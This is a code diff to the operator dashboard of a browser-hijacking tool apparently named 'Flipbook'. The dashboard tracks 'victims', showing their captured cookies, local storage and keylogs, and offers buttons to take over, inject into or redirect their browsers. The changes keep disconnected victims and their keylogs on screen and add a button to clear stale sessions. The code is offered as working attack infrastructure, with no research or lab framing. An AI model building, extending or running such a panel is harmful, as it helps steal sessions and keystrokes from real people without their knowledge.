@@ -55,9 +55,14 @@
 
   <!-- ── Sidebar: victim list ─────────────────────────────────────── -->
   <div class="sidebar d-flex flex-column">
-    <div style="padding:12px 16px; border-bottom:1px solid #0f3460; font-size:1.1em; color:#e94560; font-weight:bold;">
-      Flipbook
-      <span id="conn-dot" class="status-dot inactive ms-2" title="Socket status"></span>
+    <div style="padding:12px 16px; border-bottom:1px solid #0f3460; font-size:1.1em; color:#e94560; font-weight:bold; display:flex; align-items:center; justify-content:space-between;">
+      <div>
+        Flipbook
+        <span id="conn-dot" class="status-dot inactive ms-2" title="Socket status"></span>
+      </div>
+      <button class="btn btn-sm btn-outline-danger" id="btn-clear-stale" style="font-size:0.7em; padding:2px 8px;" title="Clear disconnected sessions">
+        Clear Stale
+      </button>
     </div>
     
     <!-- System Status Bar -->
@@ -179,13 +184,14 @@
       const cookieBox     = document.getElementById('cookie-box');
       const storageSection= document.getElementById('storage-section');
       const storageBox    = document.getElementById('storage-box');
+      const btnClearStale = document.getElementById('btn-clear-stale');
 
       // ── Connection status ─────────────────────────────────────────────────
       socket.on('connect',    () => connDot.classList.remove('inactive'));
       socket.on('disconnect', () => connDot.classList.add('inactive'));
 
       // ── Victim list ───────────────────────────────────────────────────────
-      const victims = new Map(); // browserId → { target, connectedAt, ip, cardEl, thumbUrl }
+      const victims = new Map(); // browserId → { target, connectedAt, ip, cardEl, thumbUrl, status, keylog }
 
       socket.on('victim_list', (list) => {
         list.forEach(addVictim);
@@ -193,11 +199,47 @@
 
       socket.on('new_victim', addVictim);
 
-      socket.on('victim_disconnected', ({ browserId }) => {
+      socket.on('victim_disconnected', ({ browserId, status, keylog }) => {
         const v = victims.get(browserId);
-        if (v) { v.cardEl.remove(); victims.delete(browserId); }
-        if (selectedBrowserId === browserId) deselectVictim();
-        noVictimsMsg.style.display = victims.size === 0 ? '' : 'none';
+        if (!v) return;
+        
+        // Update victim status to disconnected
+        v.status = status;
+        v.keylog = keylog || v.keylog;
+        
+        // Update card visual appearance
+        const card = v.cardEl;
+        card.style.opacity = '0.6';
+        card.style.pointerEvents = 'none';
+        card.querySelector('.status-dot').classList.add('inactive');
+        
+        // Add disconnected badge
+        const targetBadge = card.querySelector('.badge-target');
+        if (targetBadge && !card.querySelector('.badge-disconnected')) {
+          const disconnectedBadge = document.createElement('span');
+          disconnectedBadge.className = 'badge badge-disconnected rounded-pill';
+          disconnectedBadge.style.background = '#e74c3c';
+          disconnectedBadge.style.fontSize = '0.7em';
+          disconnectedBadge.textContent = 'DISCONNECTED';
+          targetBadge.parentElement.appendChild(disconnectedBadge);
+        }
+        
+        // If this was the selected victim, disable takeover controls
+        if (selectedBrowserId === browserId) {
+          btnTakeover.disabled = true;
+          btnGiveBack.disabled = true;
+          btnInject.disabled = true;
+          btnNav.disabled = true;
+          if (inTakeover) {
+            inTakeover = false;
+            takeoverView.classList.remove('active');
+            infoPanel.style.display = '';
+            detachTakeoverInput();
+          }
+        }
+        
+        // Keep session visible - don't remove from list
+        // noVictimsMsg.style.display = victims.size === 0 ? '' : 'none';
       });
 
       function addVictim(info) {
@@ -224,7 +266,13 @@
         card.addEventListener('click', () => selectVictim(info.browserId));
         victimList.appendChild(card);
 
-        victims.set(info.browserId, { ...info, cardEl: card, thumbUrl: null, keylog: info.keylog ?? '' });
+        victims.set(info.browserId, { 
+          ...info, 
+          cardEl: card, 
+          thumbUrl: null, 
+          keylog: info.keylog ?? '',
+          status: info.status ?? 'active'
+        });
       }
 
       // ── Thumbnails ─────────────────────────────────────────────────────────
@@ -447,6 +495,34 @@
       btnNav.addEventListener('click', () => {
         const url = navInput.value.trim();
         if (url) { socket.emit('navigate', { url }); navInput.value = ''; }
+      });
+
+      // ── Clear Stale Sessions ──────────────────────────────────────────────
+      btnClearStale.addEventListener('click', () => {
+        const staleCount = Array.from(victims.values()).filter(v => v.status === 'disconnected').length;
+        if (staleCount === 0) {
+          alert('No disconnected sessions to clear.');
+          return;
+        }
+        
+        if (!confirm(`Clear ${staleCount} disconnected session(s)?`)) return;
+        
+        // Remove all disconnected victims
+        victims.forEach((v, browserId) => {
+          if (v.status === 'disconnected') {
+            if (v.thumbUrl) URL.revokeObjectURL(v.thumbUrl);
+            v.cardEl.remove();
+            victims.delete(browserId);
+          }
+        });
+        
+        // Show "no victims" message if list is empty
+        noVictimsMsg.style.display = victims.size === 0 ? '' : 'none';
+        
+        // Deselect if current selection was cleared
+        if (selectedBrowserId && !victims.has(selectedBrowserId)) {
+          deselectVictim();
+        }
       });
 
       // ── Error display ─────────────────────────────────────────────────────
